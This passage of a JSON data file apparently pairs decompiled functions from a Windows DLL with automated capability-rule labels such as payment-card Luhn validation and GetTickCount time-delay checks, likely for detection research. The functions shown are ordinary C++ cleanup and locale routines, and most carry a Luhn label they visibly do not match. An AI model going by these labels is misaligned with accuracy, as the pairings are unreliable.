        "decompiled_code": "\nvoid fcn.18006c850(code **arg1)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    code *arg1_00;\n    ulong in_RDX;\n    \n    fcn.18006d370(arg1 + 0x19, in_RDX);\n    if (0x7 < arg1[0x15]) {\n        pcVar2 = arg1[0x12];\n        iVar1 = arg1[0x15] * 2;\n        arg1_00 = pcVar2;\n        if (0xfff < iVar1 + 2U) {\n            arg1_00 = *(pcVar2 + -8);\n            if (0x1f < (pcVar2 - arg1_00) - 8U) {\n                fcn.1800b3528(pcVar2 - arg1_00, iVar1 + 0x29);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.18008fb24(arg1_00);\n    }\n    arg1[0x15] = 0x7;\n    arg1[0x14] = NULL;\n    *(arg1 + 0x12) = 0;\n    if (arg1[8] != NULL) {\n        (**0x1800de0a8)();\n    }\n    *arg1 = vtable.StaticDialog.0;\n    if (arg1[3] == NULL) {\n        return;\n    }\n    (**0x1800de7d8)(arg1[3], 0xffffffeb);\n    (**0x1800de7f0)(arg1[2], 0x7f4, 1, arg1[3]);\n    // WARNING: Could not recover jumptable at 0x00018006c917. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x1800de680)(arg1[3]);\n    return;\n}\n",
        "token_count": 430
    },
    "18006d12": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18006d120(void)\n\n{\n    ulong uVar1;\n    \n    if (*0x1801247a8 != 0) {\n        fcn.18001e690(*0x1801247a8);\n        (**(*0x180124790 + 0x30))(0x180124790, 0);\n        uVar1 = (**0x1800de798)(*0x1801247a8, 0x26b8);\n        (**0x1800de7f0)(uVar1, 0x407, 0, 0);\n        if (*0x180123cd0 != 0) {\n            fcn.18001e690(*0x180123cd0);\n            (**(*0x180123cb8 + 0x30))(0x180123cb8, 0);\n            uVar1 = (**0x1800de798)(*0x180123cd0, 0x26b8);\n            (**0x1800de7f0)(uVar1, 0x407, 0, 0);\n        }\n        if (*0x180124058 != 0) {\n            fcn.18001e690(*0x180124058);\n            (**(*0x180124040 + 0x30))(0x180124040, 0);\n            (**0x1800de7f0)(*0x1801240a0, 0x407, 0, 1);\n        }\n        if (*0x1801240c8 != 0) {\n            fcn.18001e690(*0x1801240c8);\n            (**(*0x1801240b0 + 0x30))(0x1801240b0, 0);\n        }\n        if (*0x180123f78 != 0) {\n            fcn.18001e690(*0x180123f78);\n            (**(*0x180123f60 + 0x30))(0x180123f60, 0);\n            if (*0x180123eb8 != 0) {\n                fcn.18001e690(*0x180123eb8);\n                (**(*0x180123ea0 + 0x30))(0x180123ea0, 0);\n            }\n        }\n    }\n    if (*0x180125618 != 0) {\n        fcn.18001e690(*0x180125618);\n        (**(*0x180125600 + 0x30))(0x180125600, 0);\n        if (*0x180123eb8 != 0) {\n            fcn.18001e690(*0x180123eb8);\n            (**(*0x180123ea0 + 0x30))(0x180123ea0, 0);\n        }\n        if (*0x180123d98 != 0) {\n            fcn.18001e690(*0x180123d98);\n            (**(*0x180123d80 + 0x30))(0x180123d80, 0);\n        }\n    }\n    if (*0x1801246c8 != 0) {\n        fcn.18001e690(*0x1801246c8);\n        (**(*0x1801246b0 + 0x30))(0x1801246b0, 0);\n        if (*0x180123eb8 != 0) {\n            fcn.18001e690(*0x180123eb8);\n            (**(*0x180123ea0 + 0x30))(0x180123ea0, 0);\n        }\n    }\n    if (*0x180124678 != 0) {\n        fcn.18001e690(*0x180124678);\n    // WARNING: Could not recover jumptable at 0x00018006d358. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(*0x180124660 + 0x30))(0x180124660, 0);\n        return;\n    }\n    return;\n}\n",
        "token_count": 878
    },
    "18006d37": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18006d370(int64_t *arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t arg1_00;\n    int64_t iVar3;\n    \n    arg1_00 = *arg1;\n    if (arg1_00 != 0) {\n        iVar3 = arg1[1];\n        if (arg1_00 != iVar3) {\n            do {\n                fcn.18004db60(arg1_00);\n                arg1_00 = arg1_00 + 0x48;\n            } while (arg1_00 != iVar3);\n            arg1_00 = *arg1;\n        }\n        uVar2 = ((arg1[2] - arg1_00) / 0x48) * 0x48;\n        iVar3 = arg1_00;\n        if (0xfff < uVar2) {\n            iVar3 = *(arg1_00 + -8);\n            if (0x1f < (arg1_00 - iVar3) - 8U) {\n                fcn.1800b3528(arg1[2] - arg1_00, uVar2 + 0x27);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar3);\n        *arg1 = 0;\n        arg1[1] = 0;\n        arg1[2] = 0;\n    }\n    return;\n}\n",
        "token_count": 335
    },
    "18006d43": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18006d430(int64_t *arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    int64_t arg1_00;\n    \n    arg1_00 = *arg1;\n    if (arg1_00 != 0) {\n        iVar3 = arg1[1];\n        if (arg1_00 != iVar3) {\n            do {\n                fcn.180025000(arg1_00);\n                arg1_00 = arg1_00 + 0xf0;\n            } while (arg1_00 != iVar3);\n            arg1_00 = *arg1;\n        }\n        iVar2 = arg1[2] - arg1_00;\n        iVar3 = SUB168(SEXT816(-0x7777777777777777) * SEXT816(iVar2) >> 0x40, 0) + iVar2;\n        uVar4 = ((iVar3 >> 7) - (iVar3 >> 0x3f)) * 0xf0;\n        iVar3 = arg1_00;\n        if (0xfff < uVar4) {\n            iVar3 = *(arg1_00 + -8);\n            if (0x1f < (arg1_00 - iVar3) - 8U) {\n                fcn.1800b3528(iVar2, uVar4 + 0x27);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar3);\n        *arg1 = 0;\n        arg1[1] = 0;\n        arg1[2] = 0;\n    }\n    return;\n}\n",
        "token_count": 389
    },
    "18006d4f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18006d4f0(int64_t *arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t arg1_00;\n    int64_t iVar3;\n    \n    arg1_00 = *arg1;\n    if (arg1_00 != 0) {\n        iVar3 = arg1[1];\n        if (arg1_00 != iVar3) {\n            do {\n                fcn.180064c70(arg1_00);\n                arg1_00 = arg1_00 + 0xe8;\n            } while (arg1_00 != iVar3);\n            arg1_00 = *arg1;\n        }\n        uVar2 = ((arg1[2] - arg1_00) / 0xe8) * 0xe8;\n        iVar3 = arg1_00;\n        if (0xfff < uVar2) {\n            iVar3 = *(arg1_00 + -8);\n            if (0x1f < (arg1_00 - iVar3) - 8U) {\n                fcn.1800b3528(arg1[2] - arg1_00, uVar2 + 0x27);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar3);\n        *arg1 = 0;\n        arg1[1] = 0;\n        arg1[2] = 0;\n    }\n    return;\n}\n",
        "token_count": 337
    },
    "18006d5b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.18006d5b0(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    int64_t arg1_00;\n    uint64_t uVar3;\n    \n    if (*arg1 != 0) {\n        fcn.180063f80(*arg1, arg1[1]);\n        iVar1 = *arg1;\n        uVar3 = ((arg1[2] - iVar1) / 0x28) * 0x28;\n        arg1_00 = iVar1;\n        if (0xfff < uVar3) {\n            arg1_00 = *(iVar1 + -8);\n            if (0x1f < (iVar1 - arg1_00) - 8U) {\n                fcn.1800b3528(iVar1 - arg1_00, uVar3 + 0x27);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.18008fb24(arg1_00);\n        *arg1 = 0;\n        arg1[1] = 0;\n        arg1[2] = 0;\n    }\n    return;\n}\n",
        "token_count": 266
    },
    "18006d64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18006d640(int64_t *arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t arg1_00;\n    int64_t iVar3;\n    \n    arg1_00 = *arg1;\n    if (arg1_00 != 0) {\n        iVar3 = arg1[1];\n        if (arg1_00 != iVar3) {\n            do {\n                fcn.180060170(arg1_00);\n                arg1_00 = arg1_00 + 0x88;\n            } while (arg1_00 != iVar3);\n            arg1_00 = *arg1;\n        }\n        uVar2 = ((arg1[2] - arg1_00) / 0x88) * 0x88;\n        iVar3 = arg1_00;\n        if (0xfff < uVar2) {\n            iVar3 = *(arg1_00 + -8);\n            if (0x1f < (arg1_00 - iVar3) - 8U) {\n                fcn.1800b3528(arg1[2] - arg1_00, uVar2 + 0x27);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar3);\n        *arg1 = 0;\n        arg1[1] = 0;\n        arg1[2] = 0;\n    }\n    return;\n}\n",
        "token_count": 334
    },
    "18006d70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.18006d700(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    int64_t arg1_00;\n    uint64_t uVar3;\n    \n    if (*arg1 != 0) {\n        fcn.180064010(*arg1, arg1[1]);\n        iVar1 = *arg1;\n        uVar3 = arg1[2] - iVar1 & 0xffffffffffffffc0;\n        arg1_00 = iVar1;\n        if (0xfff < uVar3) {\n            arg1_00 = *(iVar1 + -8);\n            if (0x1f < (iVar1 - arg1_00) - 8U) {\n                fcn.1800b3528(iVar1 - arg1_00, uVar3 + 0x27);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.18008fb24(arg1_00);\n        *arg1 = 0;\n        arg1[1] = 0;\n        arg1[2] = 0;\n    }\n    return;\n}\n",
        "token_count": 257
    },
    "18006e3f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18006e3f0(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x1801286a0;\n    iStackX24 = *0x1801286a0;\n    if (*0x180128688 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x180128688 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x180128688 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x180128688;\n    iVar3 = *(arg1 + 8);\n    if (*0x180128688 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x180128688 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.18006ee48(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x1801286a0 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 613
    },
    "18006e52": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18006e524(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x1801286a8;\n    iStackX24 = *0x1801286a8;\n    if (*0x180128690 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x180128690 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x180128690 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x180128690;\n    iVar3 = *(arg1 + 8);\n    if (*0x180128690 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x180128690 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.18006ef0c(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x1801286a8 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 612
    },
    "18006e65": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18006e658(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x1801286b0;\n    iStackX24 = *0x1801286b0;\n    if (*0x180128698 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x180128698 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x180128698 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x180128698;\n    iVar3 = *(arg1 + 8);\n    if (*0x180128698 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x180128698 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.18006efd0(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x1801286b0 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 611
    },
    "18007239": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_11h\n// WARNING: Variable defined which should be unmapped: var_31h\n// WARNING: Variable defined which should be unmapped: var_39h\n\nvoid fcn.180072398(ulong arg1, uint *arg2, uint *arg3, ulong arg4)\n\n{\n    uint uVar1;\n    uint uVar2;\n    char cVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int64_t iVar6;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint *in_stack_00000038;\n    uchar auStack200 [32];\n    uint uStack168;\n    char **ppcStack160;\n    int32_t aiStack152 [2];\n    char *pcStack144;\n    int64_t iStack136;\n    ulong uStack128;\n    char acStack120 [31];\n    uint64_t var_51h;\n    ulong var_49h;\n    ulong var_41h;\n    ulong var_39h;\n    ulong var_31h;\n    ulong var_11h;\n    \n    uStack128 = 0xfffffffffffffffe;\n    *NULL = *0x180123080 ^ auStack200;\n    iStack136 = *(*(in_stack_00000028 + 0x40) + 8);\n    (**0x1800de8f0)();\n    uStack168 = *(in_stack_00000028 + 0x18);\n    ppcStack160 = &pcStack144;\n    uVar4 = fcn.180070adc(arg1, acStack120, arg3, arg4);\n    if (iStack136 != 0) {\n        iVar6 = (**0x1800de8f0)();\n        if (iVar6 != 0) {\n            (**0x1800de8f0)(iVar6, 1);\n        }\n    }\n    if (acStack120[0] == '\\0') {\n        *in_stack_00000030 = 2;\n        *in_stack_00000038 = 0;\n    }\n    else {\n        uVar5 = fcn.18008eb74(acStack120, &pcStack144, uVar4, aiStack152);\n        *in_stack_00000038 = uVar5;\n        if ((pcStack144 == acStack120) || (aiStack152[0] != 0)) {\n            *in_stack_00000030 = 2;\n        }\n    }\n    cVar3 = fcn.1800738b4(arg3, arg4);\n    if (cVar3 != '\\0') {\n        *in_stack_00000030 = *in_stack_00000030 | 1;\n    }\n    uVar5 = arg3[1];\n    uVar1 = arg3[2];\n    uVar2 = arg3[3];\n    *arg2 = *arg3;\n    arg2[1] = uVar5;\n    arg2[2] = uVar1;\n    arg2[3] = uVar2;\n    fcn.18008fb00(stack0xffffffffffffffa8 ^ auStack200);\n    return;\n}\n",
        "token_count": 695
    },
    "1800ae4a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.1800ae4a0(void)\n\n{\n    bool bVar1;\n    int64_t iVar2;\n    \n    iVar2 = fcn.1800af0b0();\n    bVar1 = false;\n    if (iVar2 != 0) {\n        bVar1 = 0 < *(iVar2 + 0x30);\n    }\n    return bVar1;\n}\n",
        "token_count": 85
    },
    "1800752f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800752f8(void)\n\n{\n    if (*0x1801287d0 == 0) {\n        if (*0x1801287c8 != 0) {\n            (**0x1800de8f0)();\n        }\n    }\n    else {\n        (**0x1800de8f0)();\n    }\n    return;\n}\n",
        "token_count": 78
    },
    "180091e1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.180091e1c(void)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    \n    if (*0x180128838 != 0) {\n    // WARNING: Could not recover jumptable at 0x0001800753e0. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar2 = (**0x1800de8f0)();\n        return uVar2;\n    }\n    uVar1 = (**0x1800de148)();\n    return uVar1;\n}\n",
        "token_count": 124
    },
    "18007551": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180075518(void)\n\n{\n    if (*0x1801287e0 != 0) {\n        (**0x1800de8f0)();\n    }\n    return;\n}\n",
        "token_count": 43
    },
    "18007584": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_30h\n\nvoid fcn.18007584c(ulong arg1, ulong arg2, uint64_t arg3, int16_t *arg4)\n\n{\n    code *pcVar1;\n    ulong arg1_00;\n    char cVar2;\n    int16_t iVar3;\n    uchar *puVar4;\n    uchar uVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    uchar *puVar8;\n    int64_t iVar9;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    uchar auStack168 [32];\n    char cStack136;\n    uint uStack132;\n    ulong uStack128;\n    ulong uStack120;\n    ulong uStack112;\n    uchar uStack104;\n    unkbyte7 Stack103;\n    uint64_t var_50h;\n    uint64_t var_48h;\n    uint64_t var_40h;\n    ulong var_38h;\n    ulong var_30h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    \n    uStack112 = 0xfffffffffffffffe;\n    var_40h = *0x180123080 ^ auStack168;\n    iVar9 = 0;\n    if (*arg4 != 0) {\n        iVar3 = *arg4;\n        uVar6 = arg3;\n        do {\n            arg3 = uVar6 + 1;\n            if (iVar3 != *arg4) {\n                arg3 = uVar6;\n            }\n            iVar9 = iVar9 + 1;\n            iVar3 = arg4[iVar9];\n            uVar6 = arg3;\n        } while (iVar3 != 0);\n    }\n    var_50h = 0;\n    var_48h = 0xf;\n    uStack104 = 0;\n    uStack128 = arg1;\n    uStack120 = arg2;\n    if (arg3 < 0x10) {\n        var_50h = arg3;\n        fcn.1800ae290(&uStack104, 0, arg3);\n        (&uStack104)[arg3] = 0;\n    }\n    else {\n        fcn.180014010(&uStack104, arg3);\n    }\n    uStack132 = 0xfffffffe;\n    uVar10 = 1;\n    puVar8 = CONCAT71(Stack103, uStack104);\n    uVar6 = var_48h;\n    while( true ) {\n        uVar7 = 0;\n        cStack136 = '\\0';\n        uVar11 = uVar7;\n        if (arg3 == 0) break;\n        do {\n            for (; (arg4[uVar7] != 0 && (arg4[uVar7] != *arg4)); uVar7 = uVar7 + 1) {\n            }\n            puVar4 = &uStack104;\n            if (0xf < uVar6) {\n                puVar4 = puVar8;\n            }\n            if (puVar4[uVar11] == '\\0') {\n                uVar7 = uVar7 + uVar10;\n                if ((arg4[uVar7] == *arg4) || (arg4[uVar7] == 0)) {\n                    uStack132 = uVar11;\n                }\n                else {\n                    cVar2 = fcn.1800890e8(uStack128, uStack120);\n                    if ((cVar2 == '\\0') && (iVar3 = fcn.1800783e4(uStack128),  arg4[uVar7] == iVar3)) {\n                        cStack136 = '\\x01';\n                        goto code_r0x000180075a1c;\n                    }\n                }\n                puVar4 = &uStack104;\n                if (0xf < uVar6) {\n                    puVar4 = puVar8;\n                }\n                uVar5 = 0x7f;\n                if (uVar10 < 0x7f) {\n                    uVar5 = uVar10;\n                }\n                puVar4[uVar11] = uVar5;\n                puVar8 = CONCAT71(Stack103, uStack104);\n                uVar6 = var_48h;\n            }\n            else {\n                puVar4 = &uStack104;\n                if (0xf < uVar6) {\n                    puVar4 = puVar8;\n                }\n                uVar7 = uVar7 + puVar4[uVar11];\n            }\ncode_r0x000180075a1c:\n            arg1_00 = uStack128;\n            uVar11 = uVar11 + 1;\n        } while (uVar11 < arg3);\n        if ((cStack136 == '\\0') || (cVar2 = fcn.1800890e8(uStack128, uStack120),  cVar2 != '\\0')) break;\n        uVar10 = uVar10 + 1;\n        fcn.18007f190(arg1_00);\n        uStack132 = 0xffffffff;\n    }\n    if (0xf < uVar6) {\n        puVar4 = puVar8;\n        if ((0xfff < uVar6 + 1) && (puVar4 = *(puVar8 + -8),  0x1f < puVar8 + (-8 - puVar4))) {\n            fcn.1800b3528();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        fcn.18008fb24(puVar4);\n    }\n    fcn.18008fb00(var_40h ^ auStack168);\n    return;\n}\n",
        "token_count": 1278
    },
    "1800766c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1800766c8(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x180128a28;\n    iStackX24 = *0x180128a28;\n    if (*0x1801286d8 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x1801286d8 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x1801286d8 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x1801286d8;\n    iVar3 = *(arg1 + 8);\n    if (*0x1801286d8 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x1801286d8 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.180079280(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x180128a28 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 620
    },
    "1800767f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1800767fc(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x1801289e8;\n    iStackX24 = *0x1801289e8;\n    if (*0x180128938 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x180128938 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x180128938 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x180128938;\n    iVar3 = *(arg1 + 8);\n    if (*0x180128938 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x180128938 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.180079374(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x1801289e8 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 610
    },
    "18007693": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
